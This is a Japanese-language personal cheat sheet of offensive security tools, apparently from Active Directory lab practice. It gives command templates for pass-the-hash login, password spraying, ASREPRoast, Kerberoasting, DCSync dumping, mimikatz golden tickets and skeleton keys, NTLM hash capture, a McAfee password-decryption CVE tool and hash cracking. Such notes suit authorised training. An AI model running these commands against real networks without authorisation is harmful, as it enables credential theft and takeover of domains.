## Tools
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) (kali〇, Ruby)  
  「`evil-winrm` -i IPアドレス -u ユーザ名 -H NTハッシュ」WinRM経由でログインできる
- [exifool](https://github.com/exiftool/exiftool) (kali×, Perl)  
  「`exiftool` ファイル名 -Exifタグ名」任意のExif情報をフィルタ  
  位置情報をGoogleMapで検索するときは「-n」オプションの出力を検索にかけると良い
- ftp (kali〇, ELF)  
  「`ftp` IPアドレス -a」Anonymousログオン
- [GoBuster](https://github.com/OJ/gobuster) (kali×, Go)  
  「`gobuster` -u URL -w wordlist名 dir」URL配下のコンテンツをWordlistを用いて探索
- gpg (kali〇, ELF)    
  「`gpg` --import "GPG鍵(拡張子.key)"」→「`gpg` -d "メッセージファイル(拡張子.gpg)"」GPGファイルを復号
- [hashcat](https://github.com/hashcat/hashcat) (kali〇, C)  
  「`hashcat` -a 0 -m 値 Hashファイル名 Wordlist名」  
  「-a 0 」は辞書攻撃、「-m 値」はハッシュ形式（-m 13100 は「$krb5tgs」、-m 18200 は「$krb5asrep」、-m 5600は「NTLMv2-SSP」）
- [hashID](https://github.com/psypanda/hashID) (kali〇, python)  
  「`hashid` -j Hashファイル名」（-jで、JohnTheRipperのフォーマット・-mでHashCatのフォーマットも確認できる）
- [hydra](https://github.com/vanhauser-thc/thc-hydra) (kali〇,C)  
  「`hydra` -L ユーザリスト名 -p パスワード Domainメイン `/:A=NTLM:F=401`」でIISサーバのNTLN認証をパスワードスプレー
- [impacket](https://github.com/fortra/impacket) (Kali〇, python)  
  impacket-〇〇以外に、`python3 /usr/share/doc/python3-impacket/examples/〇〇.py`でも実行できる
  - GetNPUsers  
    - 「`impacket-GetNPUsers` -no-pass -dc-ip ドメコンIP ドメイン名/ユーザ名 -outputfile 出力ファイル名」  
      ASREPRoast（Kerberos事前認証を必要としていないユーザのTGTを取得できる）を実行  
      取得したTGTは「hashcat -a 0 -m 18200 Passwordリスト名 TGTファイル名 」  
      または「john --wordlist=Passwordリスト名 TGTファイル名」でクラックできる  
    - 「`impacket-GetNPUsers` -no-pass -dc-ip ドメコンIP -userfile ユーザリスト ドメイン名/ -outputfile 出力ファイル名」  
      では「-userfile」内の各ユーザに対してASREPRoastを実行
  - GetUserSPNs  
    「`impacket-GetUserSPNs` -dc-ip ドメコンIP ドメイン名/ユーザ名:パスワード -outputfile 出力ファイル名」  
    Kerberoasting（取得したユーザのSPNに対応したアカウントのTGSを取得できる）を実行  
    TGSは「hashcat -a 0 -m 13100 TGSファイル名 Passwordリスト」でクラックできる（JohnではTGSをサポートしてない）
  - secretsdump  
    「`impacket-secretsdump` -just-dc ドメイン名/ユーザ名:パスワード@IPアドレス -outputfile 出力ファイル名」  
    DCSync権限を持つドメインユーザを使用して、各ドメインユーザのNTハッシュやKerberosキーをダンプできる
- [John the Ripper](https://github.com/openwall/john) (kali〇, C)  
  - 「`john` --wordlist=/usr/share/wordlists/rockyou.txt Hashファイル名 --format=Hash方式」  
    「`john` Hashファイル名 --show」クラック済み結果を表示（もしくは`/home/kali/.john/.john.pot`に解析結果がある）
  - 「`john` --list=formats」全フォーマットを表示  
    「--format=Raw-MD5」MD5ハッシュ, 「--format=nt」NTハッシュ
  - johnで解析するためのパスワード抽出
    - 「`zip2john` zipファイル名 > 出力ファイル名」johnで解析できるようにZIPパスワードを抽出  
    - 「`rar2john` rarファイル名 > 出力ファイル名」johnで解析できるようにRARパスワードを抽出  
    - 「`ssh2john` SSH秘密鍵ファイル名 > 出力ファイル名」johnで解析できるようにSSH秘密鍵を抽出
    - 上記３つを実行後、「`john` --wordlist=/usr/share/wordlists/rockyou.txt 出力ファイル名」でクラック可能
  - 「john --single Hashファイル --format=Hash方式」SingleCrackモード（あんま使わん）  
    Hashファイルは「文字列:ハッシュ」形式。文字列を変換しながらHashクラックを行う
  - 「sudo `unshadow` /etc/passwd /etc/shadow」  
    Johnで /etc/shadow をクラックするためのフォーマット作成
- [Kerbrute](https://github.com/ropnop/kerbrute) (kali×, Go)
  - install  
    GitHub上のReleaseからLinuxバイナリをインストール
  - 「`./kerbrute` userenum -d ドメイン名 --dc ドメコンIP Wordlists名 -o 出力ファイル名」Domainユーザの列挙
- [mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption) (kali×, python)  
  CVE-2022-1257を悪用して、C:/ProgramData/McAfee/Agent/DB/ma.dbの「AUTH_PASSWORD」列の暗号化されたPasswordを平文に復元  
  「python3 mcafee_sitelist_pwd_decrypt.py 暗号化パスワード」
- [mimikatz](https://github.com/gentilkiwi/mimikatz) (kali〇, C)  
  「privilege::debug」→「[output '20' OK]」でAdministrator権限であるか確認
  - Golden/Silver Ticket Attacks  
    「lsadump::lsa /inject /name:krbtgt」  
    krbtgtアカウントのNTハッシュやSIDをダンプ（SilverTicketの場合は/nameで指定のユーザを指定）  
    「Kerberos::golden /user:Administrator /domain:ドメイン名 /sid:krbtgtのSID /krbtgt:krbtgtのNTハッシュ /id:500」  
    GoldenTicketを作成（SilverTicketは別の方法）  
    「misc::cmd」で先程作成したTicketに昇格する
  - Pass the Ticket  
    「sekurlsa::tickets /export」.kiribiチケットが現在地にエクスポート  
    「kerberos::ptt .kiribiチケット名」→「klist」でキャッシュされたチケットを表示で攻撃の成功を確認
  - Skeleton Key  
    「misc::skeleton」ドメコンのメモリ上にマスタパスワードを挿入し、AD認証をバイパスする
- [pdfinfo](https://github.com/howtomakeaturn/pdfinfo) (kali×, PHP)  
  「`pdfinfo` PDFファイル名」PDFメタデータの確認
- [PowerPXE](https://github.com/wavestone-cdt/powerpxe) (kal×, Powershell)  
  Windows上のPowershellで「Import-Module .\PowerPXE.ps1」でスクリプトをインポートして  
  MDTサーバからTFTP経由でBCDファイルを取得・「Get-WimFile -bcdFile "BCDファイル名"」でPXEブートイメージの場所を取得  
  MDTサーバからTFTP経由で先程の場所から取得・「Get-FindCredentials -WimFile PXEブートイメージ名」でクレデンシャルを取得  
  ※細部はBreaching Active Directoryを参照
- [Responder](https://github.com/lgandx/Responder) (kali〇, python)  
  「sudo `responder` -I インタフェース名」でNTLM通信を中継・NTLMハッシュの取得
- [Rubeus](https://github.com/GhostPack/Rubeus) (kali×, C#)  
  攻撃対象のWindowsマシンで実行する、Post-Exploitationのイメージ  
  - 「`Rubeus.exe` harvest /interval:秒数」指定した秒数間、TGTを収集する  
  - 「`Rubeus.exe` kerberoast /nowrap /outfile:出力ファイル名」  
    Kerberoasting（取得したユーザのSPNに対応したアカウントのTGSを取得できる）を実行（nowrapは改行なしで結果出力）  
    TGSは「hashcat -a 0 -m 13100 TGSファイル名 Passwordリスト」でクラックできる（JohnではTGSをサポートしてない）
  - 「`Rubeus.exe` asreproast /format:hashcat /outfile:出力ファイル名」  
    ASREPRoast（Kerberos事前認証を必要としていないユーザのTGTを取得できる）を実行  
    TGTは「hashcat -a 0 -m 18200 TGTファイル名 Passwordリスト」でクラックできる  
    （Johnでは「john --wordlist=Passwordリスト名 TGTファイル名」でクラックできる）
- scp (kali〇, ELF)  
  「`scp` SSHユーザ名@IPアドレス:/リモートパス ローカルパス」リモート先からダウンロード
- smbclient (kali〇, ELF)  
  「`smbcleint` -L IPアドレス or FQDN -U ユーザ名%パスワード」共有フォルダの列挙  
  「`smbclient` //IPアドレス/共有名 -U ユーザ名%パスワード」共有フォルダにアクセス
- [SMBMap](https://github.com/ShawnDEvans/smbmap) (kali〇, python)  
  「`smbmap` -H IPアドレス -u ユーザ名 -p パスワード」共有フォルダの列挙（smbclientと比べフォルダ権限まで確認できる）
- [sqlitebrowser](https://github.com/sqlitebrowser/sqlitebrowser) (kali〇, C++)  
  「.db」ファイルをGUIで参照
- SSH  
  SSH秘密鍵の権限は600か700でないとSSH鍵認証できない
  - sshkeygen
- [tcpdump](https://github.com/the-tcpdump-group/tcpdump) (kali〇, C)  
  「sudo `tcpdump` -SX -i インタフェース名 tcp port ポート番号」でTCP通信をHexとASCII形式で見れる

## Linux
### Command
- 「`sed` -i '1s/^/文字列' ファイル名」 ファイルの１行目（`1s`）先頭に文字列を追加（改行なし）
### Preference
- 「sudo `sed` -i '$a10.10.253.185 spookysec.local' /etc/hosts」を実行しHOSTSファイルを編集
- 「/etc/resolve.conf」はNetworkManagerが管理しているため、Viなどで編集しても元に戻る  
  Nameサーバを指定したい場合は、GUIのNetworkManagerから設定する
- `$format$rounds$salt$hash` /etc/shadowのフォーマット、`$format`でハッシュ種別が分かる

## BookMark
- [CrackStation](https://crackstation.net/)  
  hashクラック
- [hashes.com](https://hashes.com/en/decrypt/hash)  
  hashクラック
- [hash_identifier](https://hashes.com/en/tools/hash_identifier)  
  hash識別

## Link
